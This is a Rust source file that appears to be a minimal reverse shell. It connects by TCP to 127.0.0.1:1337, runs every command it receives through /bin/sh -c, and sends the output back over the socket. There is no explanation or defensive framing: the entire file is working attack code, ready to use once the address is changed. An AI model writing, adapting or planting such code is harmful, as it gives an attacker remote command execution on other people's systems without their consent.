use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    let addr = "127.0.0.1:1337";

    match TcpStream::connect(addr) {
        Ok(mut stream) => {
            stream.write_all(b"[+] Yeah!\n").ok();

            loop {
                let mut buffer = [0u8; 1024];

                match stream.read(&mut buffer) {
                    Ok(size) => {
                        let input = String::from_utf8_lossy(&buffer[..size]);
                        let output = Command::new("/bin/sh")
                            .arg("-c")
                            .arg(&*input)
                            .stdout(Stdio::piped())
                            .stderr(Stdio::piped())
                            .output();

                        match output {
                            Ok(out) => {
                                let mut result = out.stdout;
                                result.extend_from_slice(&out.stderr);
                                let _ = stream.write_all(&result);
                            }
                            Err(e) => {
                                let _ = stream.write_all(format!("Erro: {}\n", e).as_bytes());
                            }
                        }
                    }
                    Err(_) => {
                        break;
                    }
                }
            }
        }
        Err(_) => {
            eprintln!("[-] Falha ao conectar");
        }
    }
}

